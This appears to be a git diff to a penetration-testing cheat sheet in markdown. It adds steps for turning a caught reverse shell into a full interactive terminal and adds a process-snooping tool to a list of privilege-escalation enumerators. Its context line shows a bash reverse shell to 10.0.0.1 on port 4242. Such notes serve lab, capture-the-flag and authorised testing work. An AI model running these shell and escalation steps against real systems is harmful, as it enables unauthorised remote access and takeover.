@@ -25,8 +25,11 @@ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
 ## INTERACTIVE SHELL
 target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
-attacker: `stty raw -echo`, `fg`, <kbd>Enter</kbd>, <kbd>Enter</kbd>
-
+attacker: `stty raw -echo`, `fg`, hit <kbd>Enter</kbd>, <kbd>Enter</kbd>
+### optional
+target: `export TERM=xterm`\
+attacker: `stty -a` shows rows `r` and collumns `c`\
+target: `stty rows r cols c`
 ## NETCAT
 ### send data
 
@@ -145,6 +148,7 @@ sudo -l
 * LinEnum
 * LinPEAS
 * WinPEAS
+* pspys (lists runnin processes)
 ### Remote
 * enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA
 
